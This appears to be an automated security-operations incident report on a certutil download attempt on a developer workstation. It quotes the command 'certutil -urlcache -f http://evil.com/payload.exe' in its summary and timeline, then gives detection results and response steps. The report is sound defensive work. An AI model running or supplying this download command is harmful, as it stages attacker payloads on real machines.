# Incident Report: SOC-913D8012

## Overview

| Field | Value |
|---|---|
| Incident ID | SOC-913D8012 |
| Timestamp | 2026-03-11T21:19:48.222880+00:00 |
| Host | dev-workstation |
| Severity | HIGH |
| Confidence | 0.95 |
| MITRE Techniques | T1105 |
| Agents Invoked | none |

## Summary

On 2026-03-11 at 21:19:29 UTC, a highly suspicious process creation event (ID: `e3545b0b-1b10-44cb-b04f-bf541fa00c96`) was detected on the host `dev-workstation` under the user `developer`. The `certutil` utility was executed with the command line `certutil -urlcache -f http://evil.com/payload.exe`. This command attempts to download an executable file (`payload.exe`) from a clearly malicious domain (`evil.com`) using a known abused system utility. This incident is assessed with HIGH severity and 0.95 confidence, indicating a potential initial access or execution attempt, despite no specific malware agent detection at this stage. The use of `certutil -urlcache -f` is a common technique for adversaries to transfer tools or payloads onto a system.

## Timeline

1. 2026-03-11T21:19:29.324742Z: Process creation event (ID: `e3545b0b-1b10-44cb-b04f-bf541fa00c96`) detected on host `dev-workstation` by user `developer`.
2. The `certutil` process was observed executing the command: `certutil -urlcache -f http://evil.com/payload.exe`.
3. Analysis identified the command as an attempt to download an executable from a malicious domain (`evil.com`) using a living-off-the-land binary (`certutil`).
4. Incident triaged with HIGH severity and 0.95 confidence, indicating a potential initial access or execution attempt.
5. No specific malware family or external threat intelligence match was found for the downloaded payload at the time of analysis, as malware agents were skipped or did not detect a specific pattern.

## Detection Details

| Category | Result |
|---|---|
| Heuristic Risk | 0.21052631578947367 |
| Graph Anomaly Score | 0.5 |
| Malware Detected | false |
| Malware Patterns | none |
| Malware MITRE Matches | none |
| Network Suspicious | false |
| Network Reason | Not invoked |
| VirusTotal Score | N/A |
| VirusTotal Verdict | skipped |
| VirusTotal Source | skipped |
| Threat Intelligence Match | false |
| Top-level Threat Intelligence | null |

## Recommended Next Actions

1. Immediately isolate `dev-workstation` if download execution status is unknown.
2. Block and investigate domain `evil.com` and any related IOCs.
3. Validate whether `payload.exe` was written to disk and executed.
4. Collect process tree, command history, and network telemetry for user `developer`.
5. Hunt across endpoints for similar `certutil -urlcache -f` activity.